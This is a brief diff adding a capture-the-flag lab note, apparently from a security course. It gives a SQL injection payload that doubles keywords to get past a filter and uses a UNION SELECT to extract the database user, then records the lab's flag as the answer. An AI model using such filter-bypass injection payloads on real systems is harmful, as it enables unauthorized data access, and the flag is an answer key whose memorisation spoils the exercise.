@@ -1,0 +1,5 @@
+Now same as we did in dbName problem but here instead of name we put in user.
+Input to search for SQLi: pramod' oorr '1' = '1' uniunionon selselectect 1,user(),3,4,5,6,7,8,9,10,11,12,13,14 #
+
+
+FLAG: cs628a{c3c8d78e3fd8dae74100b580d62d67bd}
